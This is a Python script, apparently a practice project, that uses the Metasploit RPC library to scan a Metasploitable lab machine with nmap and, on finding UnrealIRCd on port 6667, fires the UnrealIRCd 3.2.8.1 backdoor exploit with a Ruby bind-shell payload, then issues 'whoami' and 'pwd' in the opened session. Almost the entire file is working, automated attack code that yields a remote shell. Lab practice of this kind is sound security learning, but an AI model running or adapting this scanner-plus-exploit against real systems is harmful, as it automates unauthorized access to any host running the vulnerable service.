# for now this nmaps metasploitable, checks if port 6667 is open which runs UnrealIRCd
# which has a vulnerability, and then it exploits that
from pymetasploit3.msfrpc import *
import utils
import sys
import nmap_dest

if __name__ == "__main__":
    # initial setup, dont worry what this does
    # UNCOMMENT THIS IF SHIT ISNT WORKING
    # try:
    #     utils.runThisCommand("msfrpcd -P PASSWORD")
    # except:
    #     sys.path.append('/snap/bin')
    #     utils.runThisCommand("msfrpcd -P PASSWORD")
    
    client = MsfRpcClient('PASSWORD', port=55553, ssl=True)
    # exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')

    RHOSTS = "192.168.119.129"
    nmapArgs = "-A -T4" # less aggressive than "-p- -sV -O"
    output = nmap_dest.nmap_xml_output(RHOSTS, nmapArgs)
    print(output)

    exploit = client.modules.use('exploit', 'unix/irc/unreal_ircd_3281_backdoor')
    exploit['RHOSTS'] = RHOSTS
    # payload = client.modules.use('payload', 'cmd/unix/bind_ruby')

    for line in output:
        # check if the nmap output contains UnrealIRCd and port number 6667
        ircdPos = utils.grepPositions(line, "UnrealIRCd")
        ircdPort6667Pos = utils.grepPositions(line, "6667")
        if (len(ircdPos) > 0 and len(ircdPort6667Pos) > 0):
            # TODO: gather list of exploits here and exploit them later one after the other
            print("EXPLOIT FOUND")
            exploit = client.modules.use('exploit', 'unix/irc/unreal_ircd_3281_backdoor')
            exploit['RHOSTS'] = RHOSTS
            # payload = client.modules.use('payload', 'cmd/unix/bind_ruby')
            exploit.execute(payload='cmd/unix/bind_ruby')
            sessions = client.sessions.list
            if len(sessions) > 0:
                shell = client.sessions.session('1')
                shell.write('whoami')
                shell.write('pwd')
                print(shell.read())

    print()
    